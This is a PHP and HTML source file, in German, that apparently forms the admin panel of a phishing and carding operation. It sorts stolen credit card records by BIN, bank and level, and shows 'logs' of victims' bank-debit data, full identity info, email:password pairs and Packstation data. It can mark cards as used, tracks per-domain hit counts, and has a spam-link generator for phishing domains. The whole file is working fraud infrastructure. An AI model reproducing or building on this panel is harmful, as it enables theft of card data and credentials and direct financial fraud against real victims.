													<label class="col-sm-2 control-label">Kreditkarten-Typ: </label>
													<div class="col-sm-10">
														<select class="form-control" id="select_cctyp" name="select_cctyp" onchange="this.form.submit()">
															<option></option>
															<?php
																for ($i = 0; $i < count($cleaned_array_cctyp); $i++) {
																	if (isset($cleaned_array_cctyp[$i]) && !empty($cleaned_array_cctyp[$i])) {
																		$query = 'SELECT * FROM ' . $myTable . ' WHERE category LIKE "' . $cleaned_array_cctyp[$i] . '"';
																		$cc_typ_stats = getStats($query);
																		
																		echo '<option value="' . $cleaned_array_cctyp[$i] . '">(' . $cc_typ_stats . ') ' . $cleaned_array_cctyp[$i] . '</option>';
																	}
																}
															?>
														</select>
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Kreditkarten-Bank: </label>
													<div class="col-sm-10">
														<select class="form-control" id="select_bank" name="select_bank" onchange="this.form.submit()">
															<option></option>
															<?php
																for ($i = 0; $i < count($cleaned_array_bank); $i++) {
																	if (isset($cleaned_array_bank[$i]) && !empty($cleaned_array_bank[$i])) {
																		$query = 'SELECT * FROM ' . $myTable . ' WHERE bank LIKE "' . $cleaned_array_bank[$i] . '"';
																		$bank_stats = getStats($query);
																		
																		echo '<option value="' . $cleaned_array_bank[$i] . '">(' . $bank_stats . ') ' . $cleaned_array_bank[$i] . '</option>';
																	}
																}
															?>
														</select>
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Kreditkarten-Level: </label>
													<div class="col-sm-10">
														<select class="form-control" id="select_level" name="select_level" onchange="this.form.submit()">
															<option></option>
															<?php
																for ($i = 0; $i < count($cleaned_array_binlevel); $i++) {
																	if (isset($cleaned_array_binlevel[$i]) && !empty($cleaned_array_binlevel[$i])) {
																		$query = 'SELECT * FROM ' . $myTable . ' WHERE binlevel LIKE "' . $cleaned_array_binlevel[$i] . '"';
																		$binlevel_stats = getStats($query);
																		
																		echo '<option value="' . $cleaned_array_binlevel[$i] . '">(' . $binlevel_stats . ') ' . $cleaned_array_binlevel[$i] . '</option>';
																	}
																}
															?>
														</select>
													</div>
												</div>
												
												<center>
													<button type="submit" id="searchBin" name="searchBin" class="btn btn-sm btn-success" style="width:200px">
														<span class="glyphicon glyphicon-search"></span> &nbsp;<b>Nach BIN(s) suchen</b>
													</button>
													
													<button type="submit" id="searchCCS" name="searchCCS" class="btn btn-sm btn-success" style="width:200px" title="Zeigt eine bestimmte Anzahl der Kreditkarten an">
														<span class="glyphicon glyphicon-search"></span> &nbsp;<b>x-Kreditkarten anzeigen</b>
													</button>
													
													<button type="submit" id="searchCCS_hours" name="searchCCS_hours" class="btn btn-sm btn-success" style="width:200px" title="Zeigt die Kreditkarten innerhalb des gew&auml;hlten Zeitraums an">
														<span class="glyphicon glyphicon-search"></span> &nbsp;<b>x-Stunden anzeigen</b>
													</button>
												</center>
											</div>
										</div>
										
									</div>
								</form>
								
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-info">
										<div class="panel-heading">
											<h3 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion6" href="#s_collapse6">Log-Suche</a>
											</h3>
										</div>
										
										<div id="s_collapse6" class="panel-collapse collapse <?php echo ($collapse_in_log_search ? "in" : "") ?>">
											<div class="panel-body">
												<div class="form-group">
													<label class="col-sm-2 control-label">Anzahl *: </label>
													<div class="col-sm-10">
														<input type="text" class="form-control" id="tb_search_pp_count" name="tb_search_pp_count" placeholder="Anzahl">
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Wohnort: </label>
													<div class="col-sm-10">
														<input type="text" class="form-control" id="tb_city" name="tb_city" placeholder="Wohnort">
													</div>
												</div>
												
												<div class="form-group">
													<label class="col-sm-2 control-label">Logs anzeigen: </label>
													<div class="col-sm-10">
														<select class="form-control" id="select_log_type" name="select_log_type" onchange="this.form.submit()">
															<option></option>
															<option value="1">ELV *</option>
															<option value="2">Full-Info *</option>
															<option value="12">Mail:Pass *</option>
															<option value="11">Randoms *</option>
															<option value="9">OB-Daten *</option>
															<option value="10">Packstation-Daten *</option>
															<option disabled>─────────────────────────────</option>
															<option value="3">Mail:Pass anzeigen von Kreditkartendaten *</option>
															<option value="4">Mail:Pass anzeigen von ELV Daten *</option>
															<option value="5">Mail:Pass anzeigen von Full-Info *</option>
															<option value="6">Mail:Pass only anzeigen *</option>
															<option value="7">Mail:Pass aller Logs anzeigen</option>
															<option disabled>─────────────────────────────</option>
															<option value="8">Alle</option>
														</select>
													</div>
												</div>
												
												<button type="submit" id="searchCity" name="searchCity" class="btn btn-sm btn-success" style="width:200px;margin-left:5px">
													<span class="glyphicon glyphicon-search"></span> &nbsp;<b>Wohnort suchen</b>
												</button>
											</div>
										</div>
									</div>
								</form>
								
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-info">
										<div class="panel-heading">
											<h3 class="panel-title">
												<a data-toggle="collapse" data-parent="#s_accordion7" href="#s_collapse7">Mail-Suche</a>
											</h3>
										</div>
										
										<div id="s_collapse7" class="panel-collapse collapse <?php echo ($collapse_in_mail_search ? "in" : "") ?>">
											<div class="panel-body">
												<div class="form-group">
													<div class="col-sm-12">
														<textarea name="mailpasslist" class="form-control" rows="10"></textarea>
													</div>
												</div>
												
												<button type="submit" id="searchMails" name="searchMails" class="btn btn-sm btn-success" style="width:200px;margin-left:5px">
													<span class="glyphicon glyphicon-search"></span> &nbsp;<b>E-Mails suchen</b>
												</button>
											</div>
										</div>
									</div>
								</form>
							</div>
							
						</div>
						
						<?php
							if (isset($_SESSION['logs']) && !empty($_SESSION['logs'])) {
								echo '
										<div class="panel panel-default">
											<div class="panel-heading">
												<h3 class="panel-title">Angefragte Logs: ' . $_SESSION['searched'] . '</h3>';

											if (isset($_SESSION['delete_shown_ccs_query']) && !empty($_SESSION['delete_shown_ccs_query'])) {
												echo '	<form role="form" class="form-horizontal" action="index.php" method="post" style="float:right">
																<button type="submit" id="mark_shown_ccs" name="mark_shown_ccs" class="btn btn-sm btn-warning" style="border:1px solid #fff;width:275px;float:left;margin-top:-35px;margin-right:15px" 
																	onclick="return confirm(\'Bist du dir sicher die Eintr&auml;ge als benutzt zu markieren?\');">
																	
																	<span class="glyphicon glyphicon-trash"></span> &nbsp;<b>Angezeigte Daten als benutzt markieren</b>
																</button>
																
																<button type="submit" id="delete_shown_ccs" name="delete_shown_ccs" class="btn btn-sm btn-danger" style="border:1px solid #fff;width:275px;float:right;margin-top:-35px;margin-right:5px" 
																	onclick="return confirm(\'Bist du dir sicher die angezeigten Eintr&auml;ge zu entfernen?\');">
																	
																	<span class="glyphicon glyphicon-trash"></span> &nbsp;<b>Angezeigte Daten löschen</b>
																</button>
															</form>';
											}

								echo '
											</div>';

									
								echo '
											<div class="panel-body" style="' . ((($_SESSION['logs']) == "N / A") ? "height:70px" : "height:800px; overflow:auto") . '">
												<div class="editable" contenteditable="true" style="font-size:12px">' . $_SESSION['logs'] . '</div>
											</div>
										</div>
								';
								
								unset($_SESSION['logs']);
							}
						?>
					</div>
					
					<?php
						if (isset($_SESSION['statsActive']) && !empty($_SESSION['statsActive'])) {
							echo '<div class="tab-pane active" id="stats">';
							unset($_SESSION['statsActive']);
						} else {
							echo '<div class="tab-pane" id="stats">';
						}
						
						$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "4%"';
						$visa = getStats($query);
						$visa_avg = (($ccs == 0) ? 0 : round((($visa / $ccs) * 100), 2));
						
						$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "5%"';
						$mc = getStats($query);
						$mc_avg = (($ccs == 0) ? 0 : round((($mc / $ccs) * 100), 2));
						
						$query = 'SELECT * FROM ' . $myTable . ' WHERE ccnr LIKE "3%"';
						$amex = getStats($query);
						$amex_avg = (($ccs == 0) ? 0 : round((($amex / $ccs) * 100), 2));
					?>
					
						<div class="panel panel-default">
							<div class="panel-heading">
								<h3 class="panel-title">Statistik</h3>
							</div>
							
							<div class="panel-body" style="padding:30px;overflow:auto">
								
								<table class="table" rules="cols">
									<thead>
										<tr>
											<th>Logs gesamt</th>
											<th>Logs ohne Kreditkarten [Full-Info + ELV]</th>
											<th>Logs ohne Kreditkarten [Full-Info]</th>
											<th>Logs ohne Kreditkarten [Mail : Pass]</th>
											<th>Logs mit Kreditkarten</th>
											<th><img src="src/img/visa.png">&nbsp; Visa</th>
											<th><img src="src/img/mastercard.png">&nbsp; Mastercard</th>
											<th><img src="src/img/amex.png">&nbsp; Amex</th>
										</tr>
									</thead>
									
									<tbody>
										<tr>
											<td><?php echo ($all) ?><span style="font-size:11px;margin-left:20px">100%</span></td>
											<td><?php echo $cc_skipped . '<span style="font-size:11px;margin-left:20px">' . ($cc_skipped_avg) ?>%</span></td>
											<td><?php echo $no_ccs_fullinfo . '<span style="font-size:11px;margin-left:20px">' . ($no_ccs_fullinfo_avg) ?>%</span></td>
											<td><?php echo $no_ccs_no_fullinfo . '<span style="font-size:11px;margin-left:20px">' . ($no_ccs_no_fullinfo_avg) ?>%</span></td>
											<td><?php echo $ccs . '<span style="font-size:11px;margin-left:20px">' . $ccs_avg ?>%</span></td>
											<td><?php echo $visa . '<span style="font-size:11px;margin-left:20px">' . $visa_avg ?>%</span></td>
											<td><?php echo $mc . '<span style="font-size:11px;margin-left:20px">' . $mc_avg ?>%</span></td>
											<td><?php echo $amex . '<span style="font-size:11px;margin-left:20px">' . $amex_avg ?>%</span></td>
										</tr>
									</tbody>
								</table>
								
								<hr/> 
								<?php
									$query = 'SELECT `p_domain` FROM ' . $myTable .' ORDER by `id`';

									$array_domains = array();
									
									$out_domain = NULL;
									
									if (!($stmt = $mySQLcon->prepare($query))) {
										die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
									}

									if (!$stmt->execute()) {
										die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
									}
									
									if (!$stmt->bind_result($out_domain)) {
										die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
									}
									
									while ($stmt->fetch()) {
										if (!empty($out_domain)) {
											$array_domains[] .= $out_domain;
										}
									}
					
									$stmt->close();
									
									$cleaned_array_domains = array_keys(array_flip($array_domains));
								?>
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<table class="table" rules="cols">
										<thead>
											<tr>
												<th>Domain</th>
												<th>Logs</th>
												<th><span class="glyphicon glyphicon-remove-circle"></span></th>
											</tr>
										</thead>
										
										<tbody>
											
											<?php
												for ($i = 0; $i < count($cleaned_array_domains); $i++) {
													if (isset($cleaned_array_domains[$i]) && !empty($cleaned_array_domains[$i])) {
														$query = 'SELECT * FROM ' . $myTable . ' WHERE p_domain LIKE "' . $cleaned_array_domains[$i] . '"';
														$domain_stats = getStats($query);
														
														echo '<tr>
																	<td>' . $cleaned_array_domains[$i] . '</td>
																	<td>' . $domain_stats . '</td>
																	<td>
																		<button type="submit" id="resetDomainStat" name="resetDomainStat" value="' . $cleaned_array_domains[$i] . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0" formnovalidate>
																			<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px" novalidate></span>
																		</button>
																	</td>
																</tr>';
													}
												}
											?>
											
										</tbody>
									</table>
								</form>
								
								<hr/> 
								<?php
									$query = 'SELECT `visit_date` FROM `visitor_stats` ORDER by `id`';

									$array_visits = array();
									
									$out_visit = NULL;
									
									if (!($stmt = $mySQLcon->prepare($query))) {
										die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
									}

									if (!$stmt->execute()) {
										die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
									}
									
									if (!$stmt->bind_result($out_visit)) {
										die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
									}
									
									while ($stmt->fetch()) {
										if (!empty($out_visit)) {
											$array_visits[] .= $out_visit;
										}
									}
					
									$stmt->close();
									
									$cleaned_array_visits = array_keys(array_flip($array_visits));
								?>
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<table class="table" rules="cols">
										<thead>
											<tr>
												<th>Datum</th>
												<th>Besucher</th>
											</tr>
										</thead>
										
										<tbody>
											
											<?php
												for ($i = 0; $i < count($cleaned_array_visits); $i++) {
													if (isset($cleaned_array_visits[$i]) && !empty($cleaned_array_visits[$i])) {
														$query = 'SELECT * FROM visitor_stats WHERE visit_date LIKE "' . $cleaned_array_visits[$i] . '"';
														$visit_stats = getStats($query);
														
														echo '<tr>
																	<td>' . $cleaned_array_visits[$i] . '</td>
																	<td>' . $visit_stats . '</td>
																</tr>';
													}
												}
											?>
											
										</tbody>
									</table>
								</form>
							</div>
						</div>
					</div>
					
					<?php
						if (isset($_SESSION['settingsActive']) && !empty($_SESSION['settingsActive'])) {
							echo '<div class="tab-pane active" id="settings">';
							unset($_SESSION['settingsActive']);
						} else {
							echo '<div class="tab-pane" id="settings">';
						}
					?>
					
						<div class="panel panel-default">
							<div class="panel-heading">
								<h3 class="panel-title">Einstellungen</h3>
							</div>
							
							<div class="panel-body">
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-default">
										<div class="panel-body">
										
											<div class="row form-group">
												<label class="col-sm-2 control-label" style="width:150px">Benutzername: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_panel_username" name="tb_panel_username" placeholder="Benutzername" value="<?php echo $adminUsername ?>" required>
												</div>
											</div>
											
											<div class="row form-group">
												<label class="col-sm-2 control-label" style="width:150px">Passwort: </label>
												<div class="col-sm-10">
													<input type="password" class="form-control" id="tb_panel_passwort" name="tb_panel_passwort" placeholder="Passwort" value="<?php echo $adminPassword ?>" required>
												</div>
											</div>
										
											<hr/>
											
											<div class="form-group">
												<label class="col-sm-2 control-label" style="width:150px">Log-Anzahl: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_log_count" name="tb_log_count" placeholder="Log-Anzahl" value="<?php echo $showLastLogs ?>">
												</div>
											</div>
											
											<div class="form-group">
												<label class="col-sm-2 control-label" style="width:150px">Badwords: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_badwords" name="tb_badwords" placeholder="Badwords (mehrere mit Komma trennen)" value="<?php echo $badWords ?>">
												</div>
											</div>
											
											<div class="form-group">
												<label class="col-sm-2 control-label" style="width:250px">Erweiterte Vic-Info anzeigen:</label>	
												<div class="col-sm-10" style="width:200px;margin-top:5px">
													<input type="checkbox" class="minimal" name="show_vic_infos" style="margin-left:20px" <?php echo ($show_vic_infos ? "checked" : "") ?>> Anzeigen
												</div>
											</div>
											
											<hr/>
										
											<div class="form-group">
												<label class="col-sm-2 control-label" style="width:350px">Logs mit Kreditkarten-Eintrag:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="show_Logs_CC" style="margin-left:20px" <?php echo ($show_Logs_CC ? "checked" : "") ?>> Anzeigen
													<input type="checkbox" class="minimal" name="collapse_in_cc" style="margin-left:20px" <?php echo ($collapse_in_cc ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>

												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [ELV]:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="show_Logs_ELV" style="margin-left:20px" <?php echo ($show_Logs_ELV ? "checked" : "") ?>> Anzeigen
													<input type="checkbox" class="minimal" name="collapse_in_elv" style="margin-left:20px" <?php echo ($collapse_in_elv ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>

												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [Full-Info]:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="show_Logs_FI" style="margin-left:20px" <?php echo ($show_Logs_FI ? "checked" : "") ?>> Anzeigen
													<input type="checkbox" class="minimal" name="collapse_in_fullinfo" style="margin-left:20px" <?php echo ($collapse_in_fullinfo ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>

												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [Mail: Pass]:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="show_Mail_Pass" style="margin-left:20px" <?php echo ($show_Mail_Pass ? "checked" : "") ?>> Anzeigen
													<input type="checkbox" class="minimal" name="collapse_in_mailpass" style="margin-left:20px" <?php echo ($collapse_in_mailpass ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>
											</div>
											
											<hr/>
												
											<div class="form-group">
												<label class="col-sm-2 control-label" style="width:350px">Kreditkarten-Suche:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="collapse_in_cc_search" style="margin-left:20px" <?php echo ($collapse_in_cc_search ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>
											
												<label class="col-sm-2 control-label" style="width:350px">Log-Suche:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="collapse_in_log_search" style="margin-left:20px" <?php echo ($collapse_in_log_search ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>

												<label class="col-sm-2 control-label" style="width:350px">Mail-Suche:</label>	
												<div class="col-sm-10" style="margin-top:5px;width:300px;">
													<input type="checkbox" class="minimal" name="collapse_in_mail_search" value="0" style="margin-left:20px" <?php echo ($collapse_in_mail_search ? "checked" : "") ?>> Ausklappen
												</div>
												<div class="clearfix"></div>
											</div>
											
											<button type="submit" id="submitSettings" name="submitSettings" class="btn btn-success" style="float:right"><span class="glyphicon glyphicon-floppy-save"></span>&nbsp; Speichern</button>
										</div>
									</div>
								</form>
								
								<form role="form" class="form-horizontal" action="index.php" method="post">
									<div class="panel panel-default">
										<div class="panel-heading">
											<h3 class="panel-title">Kreditkarten-Infos / Darstellung</h3>
										</div>
							
										<div class="panel-body">
											<div class="form-group">
												<label class="col-sm-2 control-label">Kreditkarten-BIN: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_cc_bin" name="tb_cc_bin" placeholder="Kreditkarten-BIN" required>
												</div>
											</div>
											
											<div class="form-group">
												<label class="col-sm-2 control-label">Kreditkarten-Typ: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_cc_typ" name="tb_cc_typ" placeholder="Kreditkarten-Typ" required>
												</div>
											</div>
											
											<div class="form-group">
												<label class="col-sm-2 control-label">Farbdarstellung (#HEX): </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_cc_bcolor" name="tb_cc_bcolor" placeholder="Hintergrund Farbdarstellung (#HEX)" required>
												</div>
											</div>
											
											<div class="form-group">
												<label class="col-sm-2 control-label">Farbdarstellung (#HEX): </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_cc_fcolor" name="tb_cc_fcolor" placeholder="Schrift Farbdarstellung (#HEX)" required>
												</div>
											</div>
											
											<button type="submit" id="addNewCCData" name="addNewCCData" class="btn btn-success" style="float:right"><span class="glyphicon glyphicon-plus"></span>&nbsp; Hinzuf&uuml;gen</button>
											
											<br/><br/><br/>
											
											<div class="panel panel-default">
												<div class="panel-heading">
													<h3 class="panel-title">
														<a class="white" data-toggle="collapse" data-parent="#s_accordion8" href="#s_collapse8">Hinzugef&uuml;gt</a>
													</h3>
												</div>
												
												<div id="s_collapse8" class="panel-collapse collapse">
													<div class="panel-body" style="overflow: auto;">
														<table class="table" rules="cols">
															<thead>
																<tr>
																	<th>BIN</th>
																	<th>Typ</th>
																	<th>Hintergrund-Farbe</th>
																	<th>Schrift-Farbe</th>
																	<th><span class="glyphicon glyphicon-remove-circle"></span></th>
																</tr>
															</thead>
															
															<tbody>
																<?php
																	$query = 'SELECT `id`, `cc_bin`, `cc_typ`, `cc_bcolor`, `cc_fcolor` FROM `cc_settings`';

																	$out_cc_id = NULL;
																	$out_cc_bin = NULL;
																	$out_cc_typ = NULL;
																	$out_cc_bcolor = NULL;
																	$out_cc_fcolor = NULL;
																	
																	if (!($stmt = $mySQLcon->prepare($query))) {
																		die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																	}

																	if (!$stmt->execute()) {
																		die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
																	}
																	
																	if (!$stmt->bind_result($out_cc_id, $out_cc_bin, $out_cc_typ, $out_cc_bcolor, $out_cc_fcolor)) {
																		die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
																	}
																	
																	while ($stmt->fetch()) {
																		echo '<tr>
																					<td>' . $out_cc_bin . '</td>
																					<td>' . $out_cc_typ . '</td>
																					<td><span style="color:' . $out_cc_bcolor . '">' . $out_cc_bcolor . '</span></td>
																					<td><span style="color:' . $out_cc_fcolor . '">' . $out_cc_fcolor . '</span></td>
																					<td>
																						<button type="submit" id="remove_CC_Data" name="remove_CC_Data" value="' . $out_cc_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0" formnovalidate>
																							<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px" novalidate></span>
																						</button>
																					</td>
																				</tr>';
																	}
													
																	$stmt->close();
																?>
															</tbody>
														</table>
													</div>
												</div>
											</div>
												
										</div>
									</div>
								</form>
								<?php
									/*$conf = ("../../../../../etc/apache2/sites-enabled/000-default.conf");
									$read = fopen($conf, "r") or die("FEHLER");
									$spamlinks = array();
									while (!feof($read)) {
										$line = fgets($read);
										if (strpos($line, "script.php") !== false) {
											$spamlink = explode("$", explode("^", $line)[1])[0];
											$spamlinks[] .= $spamlink;
										}
									}
									
									fclose($read);*/
									$spamlinks = array();
								?>
								<form role="form" class="form-horizontal">
									<div class="panel panel-default">
										<div class="panel-heading">
											<h3 class="panel-title">Domain Spamlink Generator</h3>
										</div>
							
										<div class="panel-body">
											<div class="form-group">
												<label class="col-sm-2 control-label">Domain: </label>
												<div class="col-sm-10">
													<input type="text" class="form-control" id="tb_p_domain" name="tb_p_domain" placeholder="Domain" required>
												</div>
											</div>
											
											<div class="form-group">
												<div class="col-sm-12">
													<textarea id="tb_spamlinks" class="form-control" rows="10"><?php echo implode("\n", $spamlinks); ?></textarea>
												</div>
											</div>
											
											<button type="button" id="generateDomain" name="generateDomain" class="btn btn-success" style="float:right"><span class="glyphicon glyphicon-repeat"></span>&nbsp; Generieren</button>
										</div>
									</div>
								</form>
							</div>
							
						</div>
					</div>
					
				</div>               
            </div>
            <!-- /.container -->            
        </div>
        <!-- /.content-wrapper -->
		<form role="form" action="index.php" method="post" id="frmLogout">
			<input type="hidden" id="submitAdminLogout" name="submitAdminLogout" />
		</form>
    </div>
    <!-- ./wrapper -->
</body>
</html>